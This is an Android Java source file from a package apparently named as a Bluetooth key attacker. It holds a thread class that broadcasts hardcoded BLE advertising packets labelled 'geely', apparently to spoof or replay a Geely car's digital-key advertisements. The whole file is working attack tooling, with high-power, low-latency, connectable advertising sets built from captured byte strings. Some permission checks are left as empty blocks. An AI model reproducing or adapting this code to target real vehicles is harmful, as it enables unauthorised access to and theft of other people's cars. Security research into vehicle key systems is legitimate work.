package com.example.bkeattacker;

import android.Manifest;
import android.app.Activity;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.le.AdvertiseData;
import android.bluetooth.le.AdvertiseSettings;
import android.bluetooth.le.AdvertisingSet;
import android.bluetooth.le.AdvertisingSetCallback;
import android.bluetooth.le.AdvertisingSetParameters;
import android.bluetooth.le.BluetoothLeAdvertiser;
import android.bluetooth.le.AdvertiseCallback;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.ParcelUuid;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import com.example.bkeattacker.ConfigManager;
import com.example.bkeattacker.utils.Conversion;

import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public class BleAdvertiseThread extends Thread {
    private BluetoothAdapter bluetoothAdapter;
    private BluetoothLeAdvertiser bluetoothLeAdvertiser;
    private boolean isRunning = false;
    private Context context;
    private ConfigManager configManager = null;
    private final List<AdvertisingSetCallback> advertisingCallbacks = new ArrayList<>();
    public BleAdvertiseThread(BluetoothAdapter bluetoothAdapter, Context context, ConfigManager configManager) {
        this.bluetoothAdapter = bluetoothAdapter;
        this.context = context;  
        this.configManager = configManager;
    }

    @Override
    public void run() {
        super.run();
        startAdvertising();
    }

    private void startAdvertising() {
        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled()) {
            showToast("Bluetooth is not enabled or not available");
            return;
        }

        bluetoothLeAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser();

        if (bluetoothLeAdvertiser != null) {
            AdvertiseSettings settings = new AdvertiseSettings.Builder()
                    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                    .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                    .setConnectable(true)
                    .build();

            //geely
            final byte[] broadcastData1 = Conversion.hexStringToBytes("090602043532C5AF0EC1A3FA4BFF7E8FB0FF");
            final byte[] broadcastData2 = Conversion.hexStringToBytes("02153654373950344E31505630303032353200000000C1");

            AdvertiseData data = new AdvertiseData.Builder()
                    .addManufacturerData(0x01FE, broadcastData1)
                    .addServiceData(new ParcelUuid(UUID.fromString("00000600-0000-1000-8000-00805f9b34fb")), Conversion.hexStringToBytes("0000"))
                    .build();

            AdvertiseData adv_resp_data = new AdvertiseData.Builder()

                    .addServiceUuid(new ParcelUuid(UUID.fromString("0000fdfd-0000-1000-8000-00805f9b34fb")))  
                    .build();

            //geely2
            final byte[] broadcastData = Conversion.hexStringToBytes("02153654373950344E31505630303032353200000000C1");
            byte[] serviceData = new byte[] {(byte) 0x00, (byte) 0x00};

            AdvertiseData data2 = new AdvertiseData.Builder()
                    .addManufacturerData(0x004C, broadcastData) 
                    .build();

            AdvertiseData adv_resp_data2 = new AdvertiseData.Builder()

                    .build();

            AdvertiseData data3 = new AdvertiseData.Builder()
                    .addManufacturerData(0x004C, broadcastData) 
                    .build();

            AdvertiseData adv_resp_data3 = new AdvertiseData.Builder()
                    .addServiceData(new ParcelUuid(UUID.fromString("00000610-0000-1000-8000-00805f9b34fb")), serviceData)
                    .build();

            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.BLUETOOTH_ADVERTISE) != PackageManager.PERMISSION_GRANTED) {

            }
            try {

                AdvertisingSetParameters advertisingSetParameters=new AdvertisingSetParameters.Builder()
                        .setLegacyMode(true)
                        .setConnectable(true)
                        .setScannable(true)
                        .setInterval(AdvertisingSetParameters.INTERVAL_LOW) 
                        .setTxPowerLevel(AdvertisingSetParameters.TX_POWER_HIGH) 
                        .build();

                // Multiple advertising
                int broadcastNum = configManager.getBroadcastPackets().size();
                for (int i = 0; i < broadcastNum; i++) {
                    final int setNumber = i + 1; 

                    AdvertisingSetCallback callback = new AdvertisingSetCallback() {
                        @Override
                        public void onAdvertisingSetStarted(AdvertisingSet advertisingSet, int txPower, int status) {
                            super.onAdvertisingSetStarted(advertisingSet, txPower, status);
                            if (status == AdvertisingSetCallback.ADVERTISE_SUCCESS) {
                                showToast("Advertising set " + setNumber + " started successfully");
                            } else {
                                showToast("Advertising set " + setNumber + " failed to start, error code: " + status);
                            }
                        }

                        @Override
                        public void onAdvertisingSetStopped(AdvertisingSet advertisingSet) {
                            super.onAdvertisingSetStopped(advertisingSet);
                            showToast("Advertising set " + setNumber + " has stopped");
                        }
                    };

                    try {
                        bluetoothLeAdvertiser.startAdvertisingSet(
                                advertisingSetParameters, // Reusable same parameter
                                data,                     // Advertising data
                                adv_resp_data,            // Response data
                                null,                     // scan response data (optional)
                                null,                     // periodic parameters (optional)
                                callback                  // Pass a newly created callback each time
                        );
                        advertisingCallbacks.add(callback); // Save callback
                    } catch (Exception e) {
                        showToast("Advertising set " + setNumber + " startup exception");
                    }
                }
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            isRunning = true;

        } else {
            showToast("BluetoothLeAdvertiser is null");
        }
    }

    public void stopAdvertising() {
        if (bluetoothLeAdvertiser != null && isRunning) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.BLUETOOTH_ADVERTISE) != PackageManager.PERMISSION_GRANTED) {
            }

            for (AdvertisingSetCallback callback : advertisingCallbacks) {
                bluetoothLeAdvertiser.stopAdvertisingSet(callback);
            }

            advertisingCallbacks.clear();
            isRunning = false;
            showToast("Advertising stopped");
        }
    }


    private AdvertiseCallback advertiseCallback = new AdvertiseCallback() {
        @Override
        public void onStartSuccess(AdvertiseSettings settingsInEffect) {
            super.onStartSuccess(settingsInEffect);
            showToast("Advertising started successfully");
        }

        @Override
        public void onStartFailure(int errorCode) {
            super.onStartFailure(errorCode);
            showToast("Advertising failed with error code: " + errorCode);
        }
    };


    AdvertisingSetCallback advertiseCallback1 = new AdvertisingSetCallback() {
        @Override
        public void onAdvertisingSetStarted(AdvertisingSet advertisingSet, int txPower, int status) {
            super.onAdvertisingSetStarted(advertisingSet, txPower, status);
            if (status == AdvertisingSetCallback.ADVERTISE_SUCCESS) {
                showToast("Advertising set 1 started successfully");
            } else {
                showToast("Advertising set 1 failed to start, error code: " + status);
            }
        }

    };
    AdvertisingSetCallback advertiseCallback2= new AdvertisingSetCallback() {
        @Override
        public void onAdvertisingSetStarted(AdvertisingSet advertisingSet, int txPower, int status) {
            super.onAdvertisingSetStarted(advertisingSet, txPower, status);
            if (status == AdvertisingSetCallback.ADVERTISE_SUCCESS) {
                showToast("Advertising set 2 started successfully");
            } else {
                showToast("Advertising set 2 failed to start, error code: " + status);
            }
        }

    };

    private void showToast(final String message) {

        if (context != null) {
            ((Activity) context).runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
                }
            });
        }
    }
}
